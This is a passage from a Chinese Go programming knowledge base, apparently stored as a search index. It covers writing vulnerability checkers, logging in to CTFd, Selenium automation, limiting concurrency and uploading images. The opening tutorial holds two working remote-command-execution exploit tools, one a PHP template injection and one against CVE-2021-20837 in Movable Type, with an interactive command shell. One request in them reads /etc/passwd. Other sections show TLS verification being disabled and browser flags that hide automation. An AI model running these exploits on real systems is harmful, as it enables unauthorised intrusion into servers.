创建请求 vulurl := target + \"/mailingupgrade.php\" req, _ := http.NewRequest(\"POST\", vulurl, bytes.NewReader([]byte(`step=4&Language=de%7b$%7bsystem(%22echo vultest%22)%7d%7d&RegName=12345678901234567890123&RegNumber=12345&NextBtn=Weiter+%3E`))) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\") req.Header.Set(\"Content-type\", \"application/x-www-form-urlencoded\") // 发起请求 client := http.Client{} resp, _ := client.Do(req) body, _ := ioutil.ReadAll(resp.Body) if strings.Contains(string(body), \"vultest\") { return true } return false } /* * 漏洞检查 */ func exp(target string, command string) { // 创建请求 vulurl := target + \"/mailingupgrade.php\" data := `step=4&Language=de%7b$%7bsystem(%22` + command + `%22)%7d%7d&RegName=12345678901234567890123&RegNumber=12345&NextBtn=Weiter+%3E` req, _ := http.NewRequest(\"POST\", vulurl, bytes.NewReader([]byte(data))) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\") req.Header.Set(\"Content-type\", \"application/x-www-form-urlencoded\") // 发起请求 client := http.Client{} resp, _ := client.Do(req) body, _ := ioutil.ReadAll(resp.Body) res := strings.Replace(string(body), \"Can't load correct language file in /language directory\", \"\", -1) res = strings.TrimSpace(res) fmt.Println(res) } func main() { args := os.Args banner() argsCheck(args) target := args[1] target = urlHandler(target) if check(target) { fmt.Printf(\"target %s is vuln\", target) var command string for { for { fmt.Printf(\"\\n\\ncommand: \") fmt.Scanln(&command) if command != \"\" { break } } exp(target, command) } } else { fmt.Printf(\"target %s is not vuln\", target) } } 测试图 CVE-2021-20837 扩展5：忽略SSL证书 [!WARNING] 这个错误不容易发现，所以需要经验来判断，在初始化客户端的时候需要忽略SSL证书 var Client http.Client tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 忽略SSL证书 } Client = http.Client{ Transport: tr, } 扩展6：正则表达式 默认情况下，.是不能匹配换行符\\n的，有时候我们有需要通过.匹配到\\n，这个时候就需要稍微修改一下.了 [!TIP] 在线正则表达式测试网站：https://regex101.com/ (?s).* 实例： 代码 package main import ( \"bytes\" \"crypto/tls\" \"encoding/base64\" \"fmt\" \"io/ioutil\" \"net/http\" \"os\" \"regexp\" \"strings\" ) // 客户端全局变量 var Client http.Client func banner(){ fmt.Println(` .___ _____ ____ __ __| _// | | _____/_ |/ |_ ______ / __ |/ | |_/ \\| \\ __\\/ ___/ / /_/ / ^ / Y Y \\ || | \\___ \\ \\____ \\____ ||__|_| /___||__| /____ > \\/ |__| \\/ \\/ CVE-2021-20837 `) } /* * 参数检查 */ func argsCheck(args []string) { if len(args) != 2 { fmt.Printf(\"Usage:\\n\\t./%s \\n\", args[0]) os.Exit(0) } } /* * url处理 */ func urlHandler(target string) string { // 没有http前缀的添加http前缀 if !strings.HasPrefix(target, \"http\") { target = \"http://\" + target } // 有/结尾的就去掉/ if strings.HasSuffix(target, \"/\") { // 去掉后缀 / target = strings.TrimSuffix(target, \"/\") fmt.Println(target) } return target } /* * 漏洞检查 */ func check(target string) bool { // 创建请求 vulurl := target + \"/cgi-bin/mt/mt-xmlrpc.cgi\" command := \"`cat /etc/passwd`\" base64_cmd := base64.StdEncoding.EncodeToString([]byte(command)) payload := fmt.Sprintf(` mt.handler_to_coderef %s `, base64_cmd) req, _ := http.NewRequest(\"POST\", vulurl, bytes.NewReader([]byte(payload))) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\") req.Header.Set(\"Content-type\", \"text/xml; charset=UTF-8\") // 发起请求 tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 忽略SSL证书 } Client = http.Client{ Transport: tr, } resp, _ := Client.Do(req) body, _ := ioutil.ReadAll(resp.Body) if strings.Contains(string(body), \"root:x:0\") { return true } return false } /* * 漏洞检查 */ func exp(target string, command string) { // 创建请求 vulurl := target + \"/cgi-bin/mt/mt-xmlrpc.cgi\" base64_cmd := base64.StdEncoding.EncodeToString([]byte(\"`\" + command + \"`\")) payload := fmt.Sprintf(` mt.handler_to_coderef %s `, base64_cmd) req, _ := http.NewRequest(\"POST\", vulurl, bytes.NewReader([]byte(payload))) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\") req.Header.Set(\"Content-type\", \"text/xml; charset=UTF-8\") // 发起请求 resp, _ := Client.Do(req) body, _ := ioutil.ReadAll(resp.Body) // 正则表达式匹配结果 regex, _ := regexp.Compile(\"Can't\\\\slocate\\\\s((?s).*)\\\\sin @INC\") res := regex.FindAllStringSubmatch(string(body), 1)[0][1] fmt.Println(res) } func main() { args := os.Args banner() argsCheck(args) target := args[1] target = urlHandler(target) if check(target) { fmt.Printf(\"target %s is vuln\", target) var command string for { for { fmt.Printf(\"\\n\\ncommand: \") _, _ = fmt.Scanln(&command) if command != \"\" { break } } exp(target, command) } } else { fmt.Printf(\"target %s is not vuln\", target) } } 测试图 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:14:52 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/01.GO/02.GO实例/02.使用GO编写POC.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/01.GO/02.GO实例/03.使用GO模拟登陆.html":{"url":"知识库/04.编程开发/01.GO/02.GO实例/03.使用GO模拟登陆.html","title":"03.使用GO模拟登陆","keywords":"","body":" 前期准备 goquery基础用法 创建document实例 标签选择器 ID选择器 class选择器 属性选择器 内容提取 parent>child子选择器 prev+next相邻选择器 prev~next兄弟选择器 内容过滤器 :first-of-type过滤器 :nth-child(n) 过滤器系列 :only-child 过滤器系列 选择器或(|)运算 补充说明 Cookie自动保存更新 实战 前期准备 本次为了方便解析html，快速提取登陆时需要的一些数据，类似python中的bs4，而不是采用正则表达式去匹配数据，所以会用到一个新的库 goquery：https://github.com/PuerkitoBio/goquery 安装： go get -v github.com/PuerkitoBio/goquery goquery基础用法 [!NOTE] 大部分内容匹配规则和jquery类似 以 https://cloud.ctfd.io/login 页面为例 创建document实例 req, _ := http.NewRequest(\"GET\", \"https://cloud.ctfd.io/login\", nil) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\") client := &http.Client{} resp, _ := client.Do(req) // 参数类型为 io.Reader dom, _ := goquery.NewDocumentFromReader(resp.Body) 标签选择器 这个比较简单，就是基于a,p等这些HTML的基本元素进行选择，这种直接使用Element名称作为选择器即可。比如dom.Find(\"div\") 实例：找到所有的a标签，并循环获取值（不是属性，是标签中的值） dom.Find(\"a\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Text()) }) Features Pricing Store Contact Login Sign Up Don't have an account? Sign Up # 和截图匹配的这一条 Forgot password? Exiting. ID选择器 通过ID定位到元素，算是最常用的之一 实例：比如我们要定位到id=\"navbarResponsive\"的元素，输出它的源码，不过需要注意的是，输出源码并不会输出当前的标签 selection := dom.Find(\"#navbarResponsive\") // selection := dom.Find(\"div#navbarResponsive\") // 同时匹配标签和id，更准确 fmt.Println(selection.Html()) Features Pricing Store Contact Login Sign Up class选择器 它的用法和ID选择器类似，为Find(\".class\") 实例：寻找所有class=\"nav-link元素，并输出他们的值 dom.Find(\".nav-link\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Text()) }) [!TIP] 也可以组合，如 a.nav-link：寻找所有a标签且class为nav-link的元素 Features Pricing Store Contact Login Sign Up 属性选择器 上面3种有时候还不够用，这个时候就需要属性选择器来帮忙了 实例：获取input标签中属性name为nonce的元素的value值 [!Note] 就是获取红框中的值，这里放图了下面就不放了 res, exist := dom.Find(\"input[name=nonce]\").Attr(\"value\") if exist { fmt.Println(res) // YidceDA0XHhhZVx4YmE9XHgxNFx4MTVceDhlXHgxNC9ceGUyJw== } 补充： 除了完全相等，还有其他匹配方式，使用方式类似，这里统一列举下，不再举例 选择器 说明 Find(\"div[lang]\") 筛选含有lang属性的div元素 Find(\"div[lang=zh]\") 筛选lang属性为zh的div元素 Find(\"div[lang!=zh]\") 筛选lang属性不等于zh的div元素 Find(\"div[lang¦=zh]\") 筛选lang属性为zh或者zh-开头的div元素 Find(\"div[lang*=zh]\") 筛选lang属性包含zh这个字符串的div元素 Find(\"div[lang~=zh]\") 筛选lang属性包含zh这个单词的div元素，单词以空格分开的 Find(\"div[lang$=zh]\") 筛选lang属性以zh结尾的div元素，区分大小写 Find(\"div[lang^=zh]\") 筛选lang属性以zh开头的div元素，区分大小写 以上是属性筛选器的用法，都是以一个属性筛选器为例，当然你也可以使用多个属性筛选器组合使用，比如： Find(\"div[id][lang=zh]\"),用多个中括号连起来即可。当有多个属性筛选器的时候，要同时满足这些筛选器的元素才能被筛选出来 内容提取 获取到了标签，当然就像获取到里面的值了 parent>child子选择器 [!NOTE] 上面的基本都够用了，这里再列举一些可能会用到的筛选器 如果我们想筛选出某个元素下符合条件的子元素，我们就可以使用子元素筛选器，它的语法为Find(\"parent>child\"),表示筛选parent这个父元素下，符合child这个条件的最直接（一级）的子元素。 实例：form标签下的input标签的属性value的值 res, exist := dom.Find(\"form>input\").Attr(\"value\") if exist { fmt.Println(res) // YiJceGU0YTxceGY3alx4MGYnVVx4ZDdceGNlIg== } prev+next相邻选择器 假设我们要筛选的元素没有规律，但是该元素的上一个元素有规律，我们就可以使用这种下一个相邻选择器来进行选择。 实例：h2标签旁边的p标签的值 [!TIP] 如果class的值存在空格，那么可以用属性的格式来匹配，防止空格影响结果 dom.Find(\"h2[class='block-title text-center']+p.text-center\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Text()) // Don't have an account? Sign Up }) prev~next兄弟选择器 有相邻就有兄弟，兄弟选择器就不一定要求相邻了，只要他们共有一个父元素就可以。 实例：获取lable标签的兄弟标签input dom.Find(\"label~input\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Attr(\"name\")) // email true }) 内容过滤器 有时候我们使用选择器选择出来后，希望再过滤一下，这时候就用到过滤器了 实例：获取包含内容Email的label标签 dom.Find(\"label:contains(Email)\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Text()) // Email Address }) 扩展： Find(\":contains(text)\")表示筛选出的元素要包含指定的文本 Find(\":empty\")表示筛选出的元素都不能有子元素（包括文本元素），只筛选那些不包含任何子元素的元素 Find(\":has(selector)\")和contains差不多，只不过这个是包含的是元素节点:first-of-type过滤器 :first-child选择器限制的比较死，必须得是第一个子元素，如果该元素前有其他在前面，就不能用:first-child了，这时候:first-of-type就派上用场了，它要求只要是这个类型的第一个就可以 实例：输出第一个div标签的源码ret, _ := dom.Find(\"div:first-of-type\").Html() fmt.Println(ret) 扩展： :last-child 和 :last-of-type过滤器正好和上面的2歌过滤器相反，表示最后一个过滤器:nth-child(n) 过滤器系列 表示筛选出的元素是其父元素的第n个元素，n以1开始。所以我们可以知道:first-child和:nth-child(1)是相等的。通过指定n，我们就很灵活的筛选出我们需要的元素 同样，:nth-of-type(n)和 :nth-child(n) 类似，只不过它表示的是同类型元素的第n个,所以:nth-of-type(1) 和 :first-of-type是相等的 nth-last-child(n) 和:nth-last-of-type(n) 过滤器是倒序开始计算的，最后一个元素被当成了第一个 [!WARNING] 都不举例了，没必要 :only-child 过滤器系列 Find(\":only-child\") 过滤器，从字面上看，可以猜测出来，它表示筛选的元素，在其父元素中，只有它自己，它的父元素没有其他子元素，才会被匹配筛选出来。 :only-of-type 过滤器和其他的类似，同类型元素只要只有一个，就可以被筛选出来 选择器或(|)运算 如果我们想同时筛选出div,span等元素怎么办？这时候可以采用多个选择器进行组合使用，并且以逗号(,)分割，Find(\"selector1, selector2, selectorN\")表示，只要满足其中一个选择器就可以被筛选出来，也就是选择器的或(|)运算操作。 实例：筛选出所有的meta标签和input标签，并且获取到其属性name的值 dom.Find(\"meta,input\").Each(func(i int, selection *goquery.Selection) { val, exists := selection.Attr(\"name\") if exists { fmt.Println(val) } }) viewport description author twitter:card twitter:site twitter:creator twitter:title twitter:description twitter:image email password nonce 补充说明 1、类似函数的位置操作 方法 说明 Find(selection) *Selection 根据选择器查找节点集 Eq(index int) *Selection 根据索引获取某个节点集 First() *Selection 获取第一个子节点集 Last() *Selection 获取最后一个子节点集 Next() *Selection 获取下一个兄弟节点集 NextAll() *Selection 获取后面所有兄弟节点集 Prev() *Selection 前一个兄弟节点集 Get(index int) *html.Node 根据索引获取一个节点 Index() int 返回选择对象中第一个元素的位置 Slice(start, end int) *Selection 根据起始位置获取子节点集 2、循环遍历选择的节点 方法 说明 Each(f func(int, *Selection)) *Selection 遍历 EachWithBreak(f func(int, *Selection) bool) *Selection 可中断遍历 Map(f func(int, *Selection) string) (result []string) 返回字符串数组 3、检测或获取节点属性值 方法 说明 Attr(), RemoveAttr(), SetAttr() 获取，移除，设置属性的值 AddClass(), HasClass(), RemoveClass(), ToggleClass() 类相关 Html() 获取该节点的html Length() 返回该Selection的元素个数 Text() 获取该节点的文本值 4、 在文档树之间来回跳转（常用的查找节点方法） 方法 说明 Children() 返回selection中各个节点下的孩子节点 Contents() 获取当前节点下的所有节点 Find() 查找获取当前匹配的元素 Next() 下一个元素 Prev() 上一个元素 Cookie自动保存更新 [!NOTE] 大家都知道，网站登陆后肯定有个用来鉴权的东西，而Cookie和token居多，这里我们讲一下用Cookie [!DANGER] 网上直接搜go模拟登陆，但是出来的代码都是登陆后手动设置req的cookie，而不会自动的更新cookie，既然python里面都有request.Session，那golang里面肯定也有类似的东西吧！ 结合之前的经验，发现在创建客户端的时候，会传入一个CookieJar，这玩意儿根据经验肯定是用来存放Cookie的 试一下便知 根据经验，第一次访问百度的时候，百度会给咱们分配cookie，那咱们就可以用它来试试能不能自动保存更新Cookie 然后根据它的参数构造一个CookieJar出来 jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) 再创建个http客户端给它放进去，发起请求，查看结果 package main import ( \"fmt\" \"golang.org/x/net/publicsuffix\" \"net/http\" \"net/http/cookiejar\" ) func main() { // 创建客户端 jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) client := http.Client{Jar: jar} fmt.Printf(\"访问前：\\n\") fmt.Println(client.Jar) client.Get(\"https://www.baidu.com\") fmt.Printf(\"\\n\\n访问后：\\n\") fmt.Println(client.Jar) } 可以看到我们的Cookie成功自动保存了，那就说明之前的猜想是对的 后面对百度发起访问，就会自动带上Cookie了 实战 实战模拟登陆CTFD平台：https://cloud.ctfd.io/login 主要分为3步： 获取nonce 登陆 验证登陆是否成功 完整代码： package main import ( \"fmt\" \"github.com/PuerkitoBio/goquery\" \"golang.org/x/net/publicsuffix\" \"io/ioutil\" \"net/http\" \"net/http/cookiejar\" \"net/url\" \"strings\" ) // 登陆账号密码 var Config = map[string]string{ \"email\": \"yeciyar420@zherben.com\", \"passwd\": \"xxxxx\", } // 登陆客户端 var Client http.Client /* * 1. 获取登陆需要的Nonce，同时初始化客户端 */ func getNonce() string { req, _ := http.NewRequest(\"GET\", \"https://cloud.ctfd.io/login\", nil) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\") // 初始化client jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) Client = http.Client{Jar: jar} resp, _ := Client.Do(req) dom, _ := goquery.NewDocumentFromReader(resp.Body) val, _ := dom.Find(\"input[name=nonce]\").Attr(\"value\") return val } /* * 2. 登陆 */ func login(nonce string) (bool) { // 构造请求 param := url.Values{} param.Set(\"email\", Config[\"email\"]) param.Set(\"password\", Config[\"passwd\"]) param.Set(\"nonce\", nonce) data := param.Encode() req, _ := http.NewRequest(\"POST\", \"https://cloud.ctfd.io/login\", strings.NewReader(data)) req.Header.Set(\"authority\", \"cloud.ctfd.io\") req.Header.Set(\"content-type\", \"application/x-www-form-urlencoded\") req.Header.Set(\"user-agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\") req.Header.Set(\"referer\", \"https://cloud.ctfd.io/admin\") // 发起请求 resp, _ := Client.Do(req) source, _ := ioutil.ReadAll(resp.Body) if strings.Contains(string(source), \"Your password is wrong\"){ fmt.Println(\"账号或密码错误\") return false } else { return true } } /* * 3. 验证是否登陆成功 */ func getInfo() { req, _ := http.NewRequest(\"GET\", \"https://cloud.ctfd.io/profile\", nil) req.Header.Set(\"authority\", \"cloud.ctfd.io\") req.Header.Set(\"content-type\", \"application/x-www-form-urlencoded\") req.Header.Set(\"user-agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\") req.Header.Set(\"referer\", \"https://cloud.ctfd.io/admin\") resp, _ := Client.Do(req) if resp.StatusCode == 200 { dom, _ := goquery.NewDocumentFromReader(resp.Body) val, exists := dom.Find(\"#name-input\").Attr(\"value\") if exists { fmt.Printf(\"Success, Login as %s\\n\", val) } } } func main() { nonce := getNonce() fmt.Println(\"Nonce: \", nonce) res := login(nonce) if res { fmt.Println(\"登陆成功，尝试获取个人信息...\") getInfo() } } 效果： Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:14:57 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/01.GO/02.GO实例/03.使用GO模拟登陆.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/01.GO/02.GO实例/04.使用GO+selenium.html":{"url":"知识库/04.编程开发/01.GO/02.GO实例/04.使用GO+selenium.html","title":"04.使用GO+selenium","keywords":"","body":" 前言 安装 基础使用 反爬 使用firefox 配置Chrome 前言 有的网站存在反爬机制，有的网站存在复杂的前端加密等等情况 这个时候就可以用selenium来模拟用户操作，简化我们的分析绕过时间 推荐：https://github.com/tebeka/selenium 安装 安装这个依赖包 go get -t -d github.com/tebeka/selenium 下载依赖 # 找到刚才下载的源码的路径 # 我的在 $GOPATH/pkg/mod/github.com/tebeka/selenium@v0.9.9/ cd vendor go run init.go --alsologtostderr --download_browsers --download_latest [!WARNING|style:flat] 下载依赖可能会遇到问题，没问题最好 手动安装：对应不同类型的浏览器进行安装 WebDriver，Google Chrome 需要安装 ChromeDriver，Firefox 则需要安装 geckodriver 安装的driver版本一定要和浏览器版本一致 基础使用 [!NOTE] 示例：https://github.com/tebeka/selenium/blob/master/example_test.go 文档：https://pkg.go.dev/github.com/tebeka/selenium#readme-documentation 实例：打开baidu.com然后搜索123123 数据那一块和python操作Selenium的方法都差不多 package main import ( \"fmt\" \"github.com/tebeka/selenium\" \"io/ioutil\" \"os\" ) const ( chromeDriverPath = \"/usr/local/bin/chromedriver\" port = 12345 ) func main() { // 创建driver服务实例 options := []selenium.ServiceOption{ //selenium.GeckoDriver(geckoDriverPath), // Specify the path to GeckoDriver in order to use Firefox. selenium.Output(os.Stderr), } selenium.SetDebug(true) service, err := selenium.NewChromeDriverService(chromeDriverPath, port, options...) if err != nil { panic(err) } defer service.Stop() // 连接到本地运行的WebDriver实例。 caps := selenium.Capabilities{ \"browserName\": \"chrome\", } wd, err := selenium.NewRemote(caps, fmt.Sprintf(\"http://localhost:%d/wd/hub\", port)) if err != nil { panic(err) } defer wd.Quit() // 发起请求 _ = wd.Get(\"http://www.baidu.com/\") // 截屏 img, _ := wd.Screenshot() _ = ioutil.WriteFile(\"a.png\", img, 0666) element, _ := wd.FindElement(selenium.ByID, \"kw\") _ = element.Clear() // 方法一 _ = element.SendKeys(\"123123\") // 方法二 //_ = element.SendKeys(` // package main // import fmt // func main(){ // fmt.Println(\"hello\") // } // `) button, _ := wd.FindElement(selenium.ByID, \"su\") _ = button.Click() source, _ := wd.PageSource() fmt.Println(source) // 避免直接关闭chromnium页面，构造一个输入 var name string fmt.Scanln(&name) } 反爬 使用firefox https://gist.github.com/jacoduplessis/322d695d4cdab6ce866b939964588642 配置Chrome Chrome启动参数大全/* 利用Selenium去获取网页的源码，有的有反爬机制，返回源码 */ func seleniumGetSource(url string) string { // 连接到本地运行的WebDriver实例。 caps := selenium.Capabilities{ \"browserName\": \"Google Chrome\", } //禁止图片加载，加快渲染速度 imagCaps := map[string]interface{}{ \"profile.managed_default_content_settings.images\": 2, } // chrome设置 chromeCaps := chrome.Capabilities{ Prefs: imagCaps, Path: \"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\", Args: []string{ //静默执行请求 //\"--headless\", // 设置Chrome无头模式，在linux下运行，需要设置这个参数，否则会报错 \"--no-sandbox\", \"--user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.11\", // 模拟user-agent，防反爬, \"--disable-blink-features=AutomationControlled\", // 从 Chrome 88 开始，它的 V8 引擎升级了，加了这个参数，window.navigator.webdriver=false \"--proxy-server=socks5://127.0.0.1:1080\", }, ExcludeSwitches: []string{ \"enable-automation\", // 禁用左上角的控制显示 }, } caps.AddChrome(chromeCaps) wd, err := selenium.NewRemote(caps, fmt.Sprintf(\"http://localhost:%d/wd/hub\", port)) if err != nil { panic(err) } defer wd.Quit() // 发起请求 _ = wd.Get(url) time.Sleep(time.Second*5) source, _ := wd.PageSource() //res, _ := wd.ExecuteScriptRaw(\"console.log(\\\"123123\\\" + window.navigator.webdriver)\", nil) //fmt.Println(string(res)) var x string _, _ = fmt.Scanln(&x) return source } Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:14:57 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/01.GO/02.GO实例/04.使用GO+selenium.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/01.GO/02.GO实例/05.限制GO并发数.html":{"url":"知识库/04.编程开发/01.GO/02.GO实例/05.限制GO并发数.html","title":"05.限制GO并发数","keywords":"","body":" 前言 尝试chan 尝试sync 尝试chan+sync√ 信号量Semaphore 协程池 参考 前言 开发过程中，如果不限制并发数，如下代码这种，可能直接造成服务器宕机，而且很多结果不会输出 [!TIP|style:flat] 很多结果不会输出，是因为主协程结束时，子协程也会终止掉。 func main() { userCount := math.MaxInt64 for i := 0; i 尝试chan package main import ( \"fmt\" \"math\" \"time\" ) func out(i int, semaphore chan bool){ fmt.Printf(\"go func: %d\\n\", i) // 释放通道 确实可以2个协程并发，但是和上面结果一样，很多结果不会输出，是因为主协程结束时，子协程也会终止掉。 go func: 1 go func: 0 go func: 3 go func: 4 go func: 5 go func: 6 go func: 7 go func: 8 尝试sync 主要使用sync.WaitGroup{} package main import ( \"fmt\" \"math\" \"sync\" \"time\" ) var wg = sync.WaitGroup{} func out(i int){ fmt.Printf(\"go func: %d\\n\", i) time.Sleep(time.Second) wg.Done() } func main() { userCount := math.MaxInt8 for i := 0; i 所有结果都显示出来了，也就是说所有子协程都执行完了，但是没有控制并发数量 尝试chan+sync√ 从上面2个可以看出，一个可以控制并发数量，另一个可以让所有子协程都执行完，所以结合一下，就能达到我们的目的了 package main import ( \"fmt\" \"math\" \"sync\" \"time\" ) var wg = sync.WaitGroup{} func out(i int, semaphone chan bool){ fmt.Printf(\"go func: %d\\n\", i) time.Sleep(time.Second) // 释放通道 结合一下，确实能达到我们想到的效果了！！！就是结果有点乱，一般来说不影响了 go func: 1 go func: 0 go func: 3 go func: 2 go func: 4 go func: 5 go func: 6 go func: 7 go func: 8 go func: 9 信号量Semaphore 和Python中的信号量一样，感觉是结合了chan+sync，确实是一个很好的方案，输出的结果也是按顺序输出的 https://github.com/EDDYCJY/gsema package main import ( \"fmt\" \"github.com/EDDYCJY/gsema\" \"math\" \"time\" ) var semaphore = gsema.NewSemaphore(2) func out(i int){ fmt.Printf(\"go func: %d\\n\", i) time.Sleep(time.Second) defer semaphore.Done() } func main() { userCount := math.MaxInt8 for i := 0; i go func: 0 go func: 1 go func: 2 go func: 3 go func: 4 go func: 5 go func: 6 go func: 7 go func: 8 go func: 9 协程池 这个就是一次性创建所有的协程，然后再根据大小来调用 https://github.com/panjf2000/ants https://github.com/Jeffail/tunny 参考 来，控制一下 Goroutine 的并发数量 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:14:57 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/01.GO/02.GO实例/05.限制GO并发数.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/01.GO/02.GO实例/06.使用GO上传图片.html":{"url":"知识库/04.编程开发/01.GO/02.GO实例/06.使用GO上传图片.html","title":"06.使用GO上传图片","keywords":"","body":" 前言 基础版 进阶版 完整版 前言 需要批量上传图片到图床，之前用python写脚本倒是很简单，不过GO因为并发太强大了，所以这次用GO来试试 基础版 构建一个上传图片的请求，主要代码在imgkr()函数中 package main import ( \"bytes\" \"fmt\" \"golang.org/x/net/publicsuffix\" \"io\" \"math/rand\" \"mime/multipart\" \"net/http\" \"net/http/cookiejar\" \"os\" \"path/filepath\" ) var client http.Client func imgkr() { // 要上传的文件 imgFilePath := \"/Users/d4m1ts/d4m1ts/Upload/logo.png\" file, _ := os.Open(imgFilePath) defer file.Close() // 设置body数据并写入缓冲区 bodyBuff := bytes.NewBufferString(\"\") //bodyBuff := &bytes.Buffer{} bodyWriter := multipart.NewWriter(bodyBuff) _ = bodyWriter.SetBoundary(fmt.Sprintf(\"-----------------------------%d\", rand.Int())) // 加入图片二进制 part, _ := bodyWriter.CreateFormFile(\"source\", filepath.Base(file.Name())) _, _ = io.Copy(part, file) // 其他字段 _ = bodyWriter.WriteField(\"a\", \"b\") // 自动补充boundary结尾 bodyWriter.Close() fmt.Println(bodyBuff) //构建的完整数据包，没有header // 组合创建数据包 req, _ := http.NewRequest(\"POST\", \"http://127.0.0.1:8000\", bodyBuff) req.ContentLength = int64(bodyBuff.Len()) req.Header.Set(\"Content-Type\", bodyWriter.FormDataContentType()) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\") client.Do(req) } func main() { jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) client = http.Client{Jar: jar} imgkr() } 接收到的数据包 进阶版 上面的数据包大概是没什么问题，但是图片的Content-Type是application/octet-stream，而一般情况下图片的应该是形如image/png 分析了一下原因，是因为CreateFormFile函数里面硬编码了 看里面的一些函数，也没找到直接设置这个地方的Content-Type的，所以我决定根据他的规则重新写一下。 分析这个函数，前面h是header头，也是我们要修改的地方，后面是调用*Writer.CreatePart，我们也模拟这个行为就可以了 所以微调一下代码（直接给代码复制粘贴过来改就可以了，也可以直接重写CreateFormFile函数，后者稍微麻烦一点点） 效果 目标达成，完整代码 package main import ( \"bytes\" \"fmt\" \"golang.org/x/net/publicsuffix\" \"io\" \"math/rand\" \"mime/multipart\" \"net/http\" \"net/http/cookiejar\" \"net/textproto\" \"os\" \"path/filepath\" \"strings\" ) var client http.Client var quoteEscaper = strings.NewReplacer(\"\\\\\", \"\\\\\\\\\", `\"`, \"\\\\\\\"\") func escapeQuotes(s string) string { return quoteEscaper.Replace(s) } func imgkr() { // 要上传的文件 imgFilePath := \"/Users/d4m1ts/d4m1ts/Upload/logo.png\" file, _ := os.Open(imgFilePath) defer file.Close() // 设置body数据并写入缓冲区 bodyBuff := bytes.NewBufferString(\"\") //bodyBuff := &bytes.Buffer{} bodyWriter := multipart.NewWriter(bodyBuff) _ = bodyWriter.SetBoundary(fmt.Sprintf(\"-----------------------------%d\", rand.Int())) // 加入图片二进制 h := make(textproto.MIMEHeader) h.Set(\"Content-Disposition\", fmt.Sprintf(`form-data; name=\"%s\"; filename=\"%s\"`, escapeQuotes(\"source\"), escapeQuotes(filepath.Base(file.Name())))) h.Set(\"Content-Type\", \"image/png\") part, _ := bodyWriter.CreatePart(h) _, _ = io.Copy(part, file) // 其他字段 _ = bodyWriter.WriteField(\"a\", \"b\") // 自动补充boundary结尾 bodyWriter.Close() fmt.Println(bodyBuff) //构建的完整数据包，没有header // 组合创建数据包 req, _ := http.NewRequest(\"POST\", \"http://127.0.0.1:8000\", bodyBuff) req.ContentLength = int64(bodyBuff.Len()) req.Header.Set(\"Content-Type\", bodyWriter.FormDataContentType()) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\") client.Do(req) } func main() { jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) client = http.Client{Jar: jar} imgkr() } 完整版 写了一个上传到https://imgtu.com/的，大家有需可以参考 为了方便以后的复制粘贴，给构造上传图片请求单独写到imgkr()函数中的，不然应该给结果解析也写里面的 package main import ( \"bytes\" \"fmt\" \"golang.org/x/net/publicsuffix\" \"io\" \"io/ioutil\" \"math/rand\" \"mime/multipart\" \"net/http\" \"net/http/cookiejar\" \"net/textproto\" \"os\" \"path/filepath\" \"regexp\" \"strings\" \"time\" \"github.com/json-iterator/go\" ) var client http.Client var quoteEscaper = strings.NewReplacer(\"\\\\\", \"\\\\\\\\\", 